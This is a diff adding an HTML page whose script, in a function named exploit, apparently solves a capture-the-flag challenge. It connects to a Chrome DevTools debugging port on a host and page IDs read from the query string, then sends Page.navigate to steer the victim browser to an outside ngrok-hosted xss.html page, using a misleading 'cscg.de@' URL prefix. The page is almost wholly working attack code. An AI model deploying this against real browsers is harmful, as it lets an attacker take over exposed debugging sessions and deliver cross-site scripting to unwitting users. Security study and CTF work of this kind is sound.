@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head> </head>
+  <body>
+    <pre id="debug"></pre>
+
+    <script>
+      function log(msg) {
+        document.getElementById("debug").innerText += msg + "\n";
+      }
+
+      function exploit(IP, id) {
+        url = "ws://" + IP + ":9222/devtools/page/" + id;
+        var ws = new WebSocket(url);
+        ws.addEventListener("error", function (err) {
+          log("[" + id + "] error: " + JSON.stringify(err));
+        });
+        ws.addEventListener("open", function (err) {
+          var req = {
+            method: "Page.navigate",
+            id: 1,
+            params: {
+              url: "http://cscg.de@f4b2152b6973.ngrok.io/xss.html",
+            },
+          };
+          ws.send(JSON.stringify(req));
+        });
+        ws.addEventListener("message", function (msg) {
+          log("[" + id + "] received: " + JSON.stringify(msg));
+        });
+      }
+
+      var wss = window.location.search.substr(1).split(",");
+      var IP = wss[0];
+      log("chrome IP: " + IP);
+      log("IDs: " + IDs);
+      var IDs = wss.splice(1);
+      IDs.forEach((id) => {
+        exploit(IP, id);
+      });
+    </script>
+  </body>
+</html>
